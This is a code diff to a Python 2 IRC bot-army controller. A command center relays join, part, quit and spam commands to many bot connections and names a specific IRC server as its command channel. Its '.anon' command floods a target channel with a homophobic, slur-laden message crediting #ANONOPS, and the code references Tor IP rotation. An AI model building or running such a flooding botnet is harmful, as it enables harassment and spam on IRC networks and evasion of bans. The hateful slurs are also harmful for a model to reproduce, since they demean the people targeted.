@@ -44,12 +44,21 @@ def receiveCommandCenter(s,channel):
 			channel = channel[1].split(" :")
 			channel = channel[0].strip()
 			sData = msg.split(" PRIVMSG "+channel+" :")[1].strip()
+			
 			if sData.startswith(".join "):
-				channel = msg.split(".join ")[1]
-				s.send("JOIN " + channel + "\r\n")       
+				for bot in bots:
+					try:
+						channel = sData.split(".join ")[1]
+						bot.send("JOIN " + channel + "\r\n")    
+					except Exception as e:
+						print "[Warning]Dead bot!"
 			if sData.startswith(".part "):
-				shit, channel = msg.split(".part ")   
-				s.send("PART " + channel + "\r\n")   
+				for bot in bots:
+					try:
+						shit, channel = msg.split(".part ")   
+						bot.send("PART " + channel + "\r\n")  
+					except Exception as e:
+						print "[Warning]Dead bot!"         
 			if sData.startswith(".quit"): 
 				for bot in bots:
 					bot.send("QUIT\r\n")       
@@ -72,12 +81,15 @@ def receiveCommandCenter(s,channel):
 			if sData.startswith(".anon "):
 				chan = msg.split(".anon ")[1]
 				for bot in bots:
-					i= 0
-					while i < 3:
-						p = sData.split(" ")
-						channel = p[1]
-						bot.send("PRIVMSG " + channel + " :FUCK YOU FAGGOT BITCHES #ANONOPS WAS HERE\r\n")
-						i+=1   
+					try:
+						i= 0
+						while i < 3:
+							p = sData.split(" ")
+							channel = p[1]
+							bot.send("PRIVMSG " + channel + " :FUCK YOU FAGGOT BITCHES #ANONOPS WAS HERE\r\n")
+							i+=1   
+					except Exception as e:
+						print "[Warning] Dead bot"
 				print "[Relayed anon command to target]"
 			if sData.startswith(".say-"):
 				try:
@@ -117,7 +129,7 @@ def NewTorIP():
 
 def CommandCenter():
 	nick = "CommandCenter"
-	server = "irc.com"
+	server = "irc.menthol.pw"
 	port = 6667
 	channel = "#command"
 	#Connect to irc server
@@ -139,7 +151,7 @@ def army(host, q, n):
 		print "bot started"
 	print "Waiting..."
 	print "Complete."
-	print "stated"
+	print "started"
 	for thread in threads:
 	    thread.join()
 	while True:
